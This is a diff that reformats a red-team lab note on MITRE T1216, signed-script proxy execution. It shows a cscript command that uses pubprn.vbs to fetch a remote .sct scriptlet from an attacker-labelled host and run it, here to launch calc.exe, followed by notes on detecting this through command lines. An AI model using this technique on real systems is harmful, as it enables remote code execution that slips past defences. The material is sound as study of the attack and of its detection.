@@ -10,8 +10,8 @@ description: >-
 
 Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml that will be executed by the script:
 
-{% code title="http://192.168.2.71/tools/mitre/proxy-script/proxy.sct" %}
 ```markup
+// http://192.168.2.71/tools/mitre/proxy-script/proxy.sct
 <?XML version="1.0"?>
 <scriptlet>
 
@@ -31,27 +31,25 @@ Using pubprn.vbs, we will execute code to launch calc.exe. First of, the xml tha
 
 </scriptlet>
 ```
-{% endcode %}
 
-{% code title="attacker@victim" %}
 ```csharp
+// attacker@victim
 cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:http://192.168.2.71/tools/mitre/proxy-script/proxy.sct
 ```
-{% endcode %}
 
 ## Observations
 
 Calc.exe gets spawned by cscript.exe which immediately closes leaving the calc.exe process orphan:
 
-![](../../.gitbook/assets/pubprn-csript.png)
+![[pubprn-csript.png]]
 
-![](../../.gitbook/assets/pubprn-ancestry.png)
+![[pubprn-ancestry.png]]
 
 Monitoring commandlines can be useful in detecting the script being abused:
 
-![](../../.gitbook/assets/pubprn-logs.png)
+![[pubprn-logs.png]]
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1216" %}
+[attack.mitre.org/wiki/Technique/T1216](https://attack.mitre.org/wiki/Technique/T1216)
 
